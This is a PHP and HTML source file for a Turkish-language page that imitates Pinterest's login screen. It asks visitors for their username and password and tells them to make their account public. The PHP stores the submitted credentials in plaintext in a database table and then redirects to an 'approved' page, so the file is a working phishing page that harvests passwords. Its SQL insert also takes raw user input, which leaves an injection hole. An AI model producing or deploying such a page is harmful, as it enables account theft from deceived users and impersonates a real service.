

<?php 
include('veritabanibaglanti.php');

if(isset($_POST["pin_button"])) {

    if (empty($_POST["pinterest_username"]) || empty($_POST["pinterest_password"])) {
        
    } else {
        $pt_username = $_POST["pinterest_username"];
        $pt_password = $_POST["pinterest_password"];

        $pinterest_sql_ekle = "INSERT INTO pinterest_users (pt_username, pt_password) VALUES ('$pt_username', '$pt_password')";

        $pinterest_sql_ekle_calistir = mysqli_query($pinterest_baglanti, $pinterest_sql_ekle);

        header("Refresh: 1.5; URL=onaylandi.php");
        exit();

        mysqli_close($pinterest_baglanti);

    }
}

?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinterest Giriş</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color:rgb(239, 35, 65); 
        }

        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
            position: relative;
            animation: fadeIn 1s ease;
        }

        .login-container h1 {
            font-size: 1.8rem;
            color: #333;
            margin-bottom: 1rem;
        }

        .login-container p {
            font-size: 0.9rem;
            color: #555;
            margin-bottom: 2rem;
        }

        .login-container form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .login-container input {
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 1rem;
            transition: border 0.3s ease;
        }

        .login-container input:focus {
            border-color: #E60023; 
            outline: none;
        }

        .login-container button {
            background-color: #E60023;
            color: white;
            font-size: 1rem;
            padding: 0.8rem;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s;
        }

        .login-container button:hover {
            background-color: #BF001D; 
            transform: scale(1.05);
        }

        .login-container a {
            font-size: 0.9rem;
            color: #E60023; 
            text-decoration: none;
            margin-top: 1rem;
            display: inline-block;
        }

        .login-container a:hover {
            text-decoration: underline;
        }

        .login-container .icon {
            font-size: 4rem;
            color: #E60023; 
            margin-bottom: 1rem;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

    </style>
</head>
<body>
    <div class="login-container">
        <i class="fab fa-pinterest icon"></i>
        <h1>Pinterest Giriş</h1>
        <p>Lütfen kullanıcı adını ve şifrenizi doğru yazın ve hesabınızın <br> herkese açık olduğundan emin olun!</p>
        <form action="#" method="POST">
            <input type="text" name="pinterest_username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="pinterest_password" placeholder="Şifre" required>
            <button name="pin_button" type="submit">Onayla</button>
        </form>
        <a href="main.php">Ana Sayfaya Dön</a>
    </div>
</body>
</html>
